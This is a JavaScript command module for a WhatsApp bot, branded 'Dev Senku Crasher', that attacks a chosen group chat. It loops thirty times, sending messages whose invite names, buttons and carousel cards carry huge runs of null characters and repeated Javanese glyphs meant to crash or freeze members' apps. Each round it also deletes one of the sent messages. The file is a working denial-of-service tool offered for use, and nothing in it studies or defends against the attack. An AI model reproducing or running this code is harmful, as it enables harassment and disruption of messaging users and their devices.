import channelSender from '../commands/channelSender.js'

async function bug1(message, client, target) {

    const remoteJid = target;

    await client.sendMessage(remoteJid, 

           {
              adminInvite: {

                       jid: `120363298524333143@newsletter`,

                       name: "✘ Dev Senku Crasher ✘" + "\u0000".repeat(1020000),  

                       caption: "Just Another Dev On The Internet", // Additional information

                       expiration: Date.now() + 1814400000, // Expiration time in seconds (example: 86400 for 24 hours)

               },
          }
      )

    }

async function clear(message, client){

    const remoteJid = message.key.remoteJid;

    await client.chatModify({

        delete: true,

        lastMessages: [
            {
                key: message.key,

                messageTimestamp: message.messageTimestamp
            }
        ]
    },

    remoteJid

)}

async function bug2(message, client, target) {

  const remoteJid = target;

  const groupMetadata= await client.groupMetadata(target);

  const participants = groupMetadata.participants.map(user => user.id);

  await client.sendMessage(

    remoteJid,
    {
      image: { url: "4.png" }, // Replace with local or hosted image

      caption: "☥ Dev Senku Crasher ☥",

      footer: "☥  🌹 ☥",

      media: true,

      interactiveButtons: [

        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `🌹 ${"ꦾ".repeat(29000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `Je t'aime ${"ꦾ".repeat(29000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `Te amo ${"ꦾ".repeat(29000)}\n\n`,
            url: "https://example.com"
          })
        },

      ]
    },
    {
      quoted: message,
       mentions: participants
    },

    

  );
}


async function bug3(message, client, target) {

  const remoteJid = target;

  const virus = "ꦾ".repeat(2000);

  const lastBug = await client.sendMessage(

    remoteJid,

    {
        text: "✘ Dev Senku Crasher ✘",

        footer: "🌹 🌹",

        cards: [

           {
              image: { url: '4.png' }, // or buffer,

              title: '✘ Dev Senku Crasher ✘',

              caption: 'Just another dev on the internet',

              footer: "🌹 🌹",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           },
           {
              image: { url: '4.png' }, // or buffer,

              title: '✘ Dev Senku Crasher ✘',

              caption: 'Just another dev on the internet',

              footer: "🌹 🌹",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           },
           {
              image: { url: '4.png' }, // or buffer,

              title: '✘ Dev Senku Crasher ✘',

              caption: 'Just another dev on the internet',

              footer: "🌹 🌹",

              buttons: [

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,


                         id: "ID"

                      })
                  },
                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"
                      })
                  },

                  {
                      name: "quick_reply",

                      buttonParamsJson: JSON.stringify({

                         display_text: virus,

                         id: "ID"

                      })
                  },
              ]
           }

        ]
    },

    { quoted : message }
)   

  return lastBug;


}

async function gcbug(message, client) {

    const remoteJid = message.key.remoteJid;

    let target;

    const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

    const commandAndArgs = messageBody.slice(1).trim(); // Remove prefix and trim
        
    const parts = commandAndArgs.split(/\s+/);
    
    const args = parts.slice(1); // Extract arguments

    if (args.length > 0) {

            if (args[0].endsWith("@g.us")) {

                await client.sendMessage(remoteJid, {

                    text: `> _*Attempting to bug the group.....*_`,

                    quoted: message
                })

                target = args[0];

            } else{

                await client.sendMessage(remoteJid, {

                    text: `> _*${args} is not a valid group id, use .gcid to get group id and copy it. Make sure it end's with @g.us*_`,

                    quoted: message
                })
            }



    } else{

            if (remoteJid.endsWith("@g.us")) {

               
                target = remoteJid;

            } else {

                await client.sendMessage(remoteJid, {

                    text: `> _*This is not a group chat, use the bug in a group chat or bug by specifying the group id.*_`,

                    quoted: message
                })

                return;

            }
        }

    for (let i = 0; i < 30; i++) {

            //await bug1(message, client, target);

            await bug2(message, client, target);
        
        	await bug3(message, client, target);

            const msg = await bug3(message, client, target);

            await clear(msg, client);

            await new Promise(resolve => setTimeout(resolve, 2000));

    }


}

export default gcbug;
